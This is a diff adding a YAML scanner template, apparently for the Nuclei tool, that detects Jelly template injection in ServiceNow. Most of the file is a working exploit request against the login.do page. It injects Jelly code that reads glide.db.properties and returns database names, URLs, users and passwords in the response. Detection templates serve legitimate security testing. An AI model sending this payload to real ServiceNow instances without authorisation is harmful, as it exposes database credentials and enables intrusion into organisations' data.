@@ -1,0 +1,28 @@
+id: Template-Injection-on-ServiceNow
+
+info:
+  name: Jelly Template Injection on ServiceNow
+  author: Brut Security
+  severity: Critical
+  description: |
+    This template detects Jelly Scripting Injection vulnerabilities by injecting a payload and checking for a db exploitation result in the response.
+  reference:
+    - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
+
+http:
+  - raw:
+      - |
+        GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E%22 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "glide.db.properties"
+          - "glide.db.name"
+          - "glide.db.rdbms"
+          - "glide.db.url"
+          - "glide.db.user"
+          - "glide.db.password"
+        part: body
